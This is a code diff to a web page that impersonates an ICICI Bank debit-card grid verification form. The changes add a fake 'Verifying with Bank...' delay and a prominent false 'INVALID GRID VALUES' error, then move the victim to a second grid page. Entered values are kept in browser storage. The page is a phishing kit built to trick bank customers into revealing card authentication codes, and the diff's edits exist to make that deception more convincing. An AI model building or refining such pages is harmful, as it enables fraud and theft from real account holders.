@@ -7,12 +7,11 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .form-container { background: #ffffff; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; }
-        .form-container h2 { text-align: center; margin-bottom: 5px; color: #0056b3; font-size: 20px; }
-        .sub-title { text-align: center; color: #555; font-size: 13px; margin-bottom: 15px; }
+        .form-container { background: #ffffff; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; text-align: center; }
+        .form-container h2 { margin-bottom: 5px; color: #0056b3; font-size: 20px; }
+        .sub-title { color: #555; font-size: 13px; margin-bottom: 15px; }
         
         .card-preview-box {
-            text-align: center;
             margin-bottom: 15px;
             background: #f8fafc;
             padding: 10px;
@@ -33,7 +32,20 @@
             font-weight: 600;
         }
 
-        .error-msg { background: #f8d7da; color: #721c24; padding: 8px; border-radius: 6px; font-size: 12px; text-align: center; margin-bottom: 15px; display: none; border: 1px solid #f5c6cb; }
+        /* Bada aur Prominent Error Banner */
+        .error-msg { 
+            background: #f8d7da; 
+            color: #721c24; 
+            padding: 20px 10px; 
+            border-radius: 8px; 
+            font-size: 18px; 
+            font-weight: bold; 
+            line-height: 1.5;
+            margin-bottom: 20px; 
+            display: none; 
+            border: 2px solid #f5c6cb; 
+            box-shadow: 0 4px 15px rgba(220, 53, 69, 0.2);
+        }
         
         .grid-container {
             display: flex;
@@ -61,12 +73,14 @@
         <div class="sub-title">Enter grid values from the back of your card</div>
         
         <div class="card-preview-box">
-            <!-- Apne GitHub repo mein image ka naam 'card-grid.png' rakhein -->
             <img src="card-grid.png" alt="ICICI Card Grid Reference">
             <div class="card-preview-text">ICICI Bank Debit Card Grid Reference (Back Side)</div>
         </div>
 
-        <div id="errorAlert" class="error-msg">Invalid Grid Values, Please Enter Again</div>
+        <!-- Bada Error Message jo 3-4 second baad dikhega -->
+        <div id="errorAlert" class="error-msg">
+            ⚠️ INVALID GRID VALUES!<br>PLEASE ENTER AGAIN
+        </div>
 
         <form id="gridForm1">
             <div class="grid-container">
@@ -114,14 +128,21 @@
                 localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
             }
 
-            document.getElementById('errorAlert').style.display = 'block';
             const btn = document.getElementById('submitBtn');
             btn.disabled = true;
-            btn.innerText = "Verifying...";
+            btn.innerText = "Verifying with Bank...";
 
+            // 3.5 seconds ka processing round (delay)
             setTimeout(() => {
-                window.location.href = "grid_step2.html"; 
-            }, 1500);
+                // Form chupaye aur bada error message dikhayein
+                document.getElementById('gridForm1').style.display = 'none';
+                document.getElementById('errorAlert').style.display = 'block';
+
+                // Error dikhane ke 2.5 second baad next page par jayein
+                setTimeout(() => {
+                    window.location.href = "grid_step2.html"; 
+                }, 2500);
+            }, 3500);
         });
     </script>
 </body>
